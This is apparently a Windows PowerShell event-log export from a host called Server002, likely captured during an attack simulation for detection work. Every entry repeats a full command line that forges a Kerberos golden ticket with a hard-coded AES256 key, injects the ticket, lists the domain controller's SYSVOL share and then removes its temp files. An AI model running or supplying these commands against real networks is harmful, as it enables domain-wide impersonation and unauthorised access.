{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6008472"},"EventRecordID":"1091","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6170216"},"EventRecordID":"1092","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6170216"},"EventRecordID":"1093","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6170216"},"EventRecordID":"1094","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6170216"},"EventRecordID":"1095","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.6339493"},"EventRecordID":"1096","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:23.9782607"},"EventRecordID":"1097","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fb107f1a-016d-416b-a9fc-45fa110f8f15\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:27.5578328"},"EventRecordID":"1098","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=adff18f5-34b8-439b-91e2-f2a3f0f2870f\r\n\tHostApplication=powershell.exe &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\r\n\r\ncmd.exe /c \"$Env:temp\\script.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\r\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\r\n\r\n# create batch file with commands to run in a separate \"runas /netonly\" session\r\n# so we don't purge Kerberos ticket from the current Windows session\r\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\r\n@\"\r\n&gt;%TEMP%\\golden.txt 2&gt;&amp;1 (\r\n  echo Purge existing tickets and create script:\r\n  klist purge\r\n  cd %temp%\r\n  \"$Env:temp\\script.exe\" ptt /ticket:kirbifile\r\n\r\n  echo.\r\n  echo Requesting SYSVOL:\r\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\r\n  \r\n  echo.\r\n  echo Tickets after requesting SYSVOL:\r\n  klist\r\n\r\n  echo.\r\n  echo End of script script\r\n)\r\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\r\n\r\n# run batch file in a new empty session (password and username do not matter)\r\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\r\n\r\n# wait until the output file has logged the entire script\r\ndo {\r\n Start-Sleep 1 # wait a bit so the output file has time to be created\r\n Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\r\n if ($_ -match 'End of script script') { break } \r\n }\r\n} while ($false) # dummy loop so that 'break' can be used\r\n\r\n# show output from new empty session\r\nGet-Content $env:TEMP\\golden.txt\r\n\r\n# cleanup temp files\r\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\r\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fb107f1a-016d-416b-a9fc-45fa110f8f15\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
